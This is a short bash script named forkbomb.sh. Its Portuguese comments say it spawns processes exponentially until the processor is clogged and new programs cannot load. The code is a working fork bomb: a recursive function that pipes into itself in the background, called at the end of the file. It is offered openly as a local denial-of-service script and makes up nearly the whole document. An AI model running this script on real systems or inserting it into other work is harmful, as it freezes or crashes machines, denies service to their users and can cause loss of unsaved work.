#!/bin/bash
#	forkbomb.sh
#		 Cria um número exponencial de processos muito rapidamente, onde
#		o processador é entupido com vários processos em thread impossibilitando 
#		o carregamento de novos programas e deixando os programas existentes em baixa prioridade (-n19). 
##

:() {
	:|: &
}
:

